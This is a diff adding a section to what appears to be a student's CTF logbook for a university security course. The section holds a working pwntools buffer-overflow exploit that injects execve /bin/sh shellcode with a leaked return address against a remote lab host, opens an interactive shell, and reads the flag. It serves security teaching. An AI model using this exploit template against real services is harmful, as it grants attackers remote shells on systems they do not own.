@@ -199,4 +199,36 @@ We are requested still to enter something on the password field due to frontend 
 
 ## Challenge 2 
 
+For this challenge, we found out that there was a buffer overflow, so we inserted the following exploit:
+
+```
+from pwn import *
+
+LOCAL = False
+
+if LOCAL:
+    proc = process("./program")
+    pause()
+else:    
+    proc = remote("ctf-fsi.fe.up.pt", 4001)
+def get_buff_addr():
+    return proc.recvline_contains(b'Your buffer is')[17:25]
+
+buff_addr_str = get_buff_addr().decode('utf-8')
+print("BUFF ADDR: " + buff_addr_str)
+
+buff_addr_bytes = bytearray.fromhex(buff_addr_str)
+buff_addr_bytes.reverse()
+
+proc.recvuntil(b":")
+offset=108
+shellcode= b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
+control_input = shellcode + b'\x90' * (offset-len(shellcode)) + buff_addr_bytes
+print(control_input)
+proc.sendline(control_input)
+proc.interactive()
+```
+
+With this exploit, we were able to acess the connection, and by using a simple cat flag.txt the system was able to return us the flag.
+![ctf](images/Logbook%208%20images/2.png)
 
